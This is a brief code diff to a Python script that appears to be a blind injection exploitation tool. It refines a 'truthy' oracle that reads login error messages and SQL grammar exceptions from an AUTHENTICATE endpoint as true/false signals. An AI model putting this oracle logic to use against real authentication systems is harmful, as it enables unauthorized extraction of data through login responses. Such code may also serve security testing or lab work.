@@ -462,7 +462,6 @@ def _auth_calibrate_oracle():
         AUTH_NULL_IS_TRUE = False
     # Else keep default (True) but mark calibrated
     AUTH_CALIBRATED = True
-    AUTH_CALIBRATED = True
 
 def truthy(agent: str):
     global AUTH_CALIBRATED
@@ -476,11 +475,12 @@ def truthy(agent: str):
     payload = j.get("payload") or {}
     if TARGET == "AUTHENTICATE":
         # AUTH responses are 401 for both exist and not-exist; use message hints conservatively
-        m = msg.lower()
+        m = (msg or "").lower()
         if not msg:
             # message null/empty -> True or False depending on calibration
             return True if AUTH_NULL_IS_TRUE else False
-        if "username or password is incorrect" in m:
+        # Treat both "username or password is incorrect" and "username/password is incorrect" (and variants)
+        if ("username" in m and "password" in m and "incorrect" in m):
             return False if AUTH_NULL_IS_TRUE else True
         if "syntaxexception" in m or "sqlgrammarexception" in m:
             # Indicates failed function/property probe
